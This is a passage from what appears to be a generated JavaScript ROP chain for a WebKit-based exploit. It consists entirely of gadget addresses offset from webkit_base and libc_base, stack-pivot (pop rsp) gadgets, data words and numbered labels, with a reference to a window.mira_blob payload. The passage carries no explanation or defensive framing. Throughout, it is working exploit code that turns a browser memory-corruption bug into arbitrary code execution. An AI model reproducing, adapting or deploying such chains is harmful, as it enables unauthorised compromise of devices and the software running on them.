webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182600, //L2828
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182584, //L2826
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2827:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2826:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2828:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182760, //L2832
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+182712, //L2830
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182744, //L2831
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2830:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2829:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2831:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2832:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+182864, //L2834
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182848, //L2833
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2834:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2835:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2836:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183064, //L2839
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+183032, //L2838
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2838:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2837:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2839:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+183168, //L2841
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+183152, //L2840
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2840:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2841:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+183280, //L2844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+183248, //L2843
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2843:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2842:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+183344, //L2845
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2845:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+183400, //L2847
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2847:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+183544, //L2850
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183560, //L2851
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+183528, //L2849
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2849:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2850:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2851:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+183720, //L2855
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+183672, //L2853
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+183704, //L2854
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2853:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2852:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2854:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+183832, //L2856
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183864, //L2858
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+183848, //L2857
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2856:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2857:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2858:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183960, //L2859
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183976, //L2860
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2859:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2860:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+184088, //L2861
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+184072, //L2862
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2862:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2861:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+184176, //L2864
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+184160, //L2863
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2863:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2864:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+184272, //L2865
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+184288, //L2866
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2865:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2866:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+184400, //L2867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+184384, //L2868
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2867:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+184472, //L2870
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+184536, //L2872
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2872:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+184656, //L2873
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+184640, //L2875
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2875:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2873:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2874:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2876:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+184784, //L2878
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+184768, //L2877
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2877:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2878:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2879:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2880:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2881:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2882:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2883:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+185096, //L2885
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2885:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2887:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2888:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+185288, //L2890
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2890:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2892:
db([4, 0]); // 0x4
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+185432, //L2894
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2894:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+185544, //L2897
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2897:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2896:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2898:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+185672, //L2900
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+185656, //L2899
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2899:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2901:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2903:
ropchain+185824, //L2902
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+197488, //L2904
//L2902:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+185896, //L2905
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2905:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2907:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472, //pop rcx
//L2908:
(window.mira_blob||0),
libc_base+793877 //pop rsi
]);
//L2910:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+186024, //L2911
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2911:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2912:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2914:
ropchain+198816, //L2913
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2916:
ropchain+186192, //L2915
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+196160, //L2917
//L2915:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+186264, //L2918
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2918:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2920:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+186384, //L2923
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186368, //L2921
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2921:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2923:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+186544, //L2927
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186496, //L2924
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+186528, //L2926
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2924:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2925:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2926:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2927:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+186672, //L2929
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+186688, //L2930
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186656, //L2928
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2928:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2929:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2930:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+186792, //L2932
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+186840, //L2935
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+186824, //L2934
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2932:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2933:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2934:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2935:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+186952, //L2936+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+186944, //L2936
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2936:
db([0, 0]); // 0x0
set_gadgets([
ropchain+186968, //L2936+24
ropchain+187288, //L2931
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+187040, //L2939
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2937:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2938:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2939:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+187136, //L2940
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187152, //L2941
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2940:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2941:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+187264, //L2942
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187248, //L2943
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2943:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+193592, //L2944
//L2931:
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2945:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2947:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+187384, //L2949
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2948:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2949:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+187440, //L2951
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2951:
db([0, 0]); // 0x0
//L2950:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+187488, //L2953
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2953:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2955:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+187608, //L2958
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187592, //L2956
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2956:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2958:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+187776, //L2961
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187792, //L2962
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187760, //L2959
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+187744, //L2960
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2960:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2959:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2961:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2962:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+187864, //L2963
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+187880, //L2964
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2963:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2964:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+187976, //L2966
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+187960, //L2965
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2965:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2966:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188056, //L2968
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2968:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2967:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2969:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+188192, //L2970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+188224, //L2972
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+188208, //L2971
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2970:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2971:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+188392, //L2974
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+188408, //L2975
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188376, //L2973
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2973:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2974:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2975:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+188512, //L2977
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+188560, //L2980
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+188544, //L2979
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2977:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2978:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2979:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2980:
db([0, 0]); // 0x0
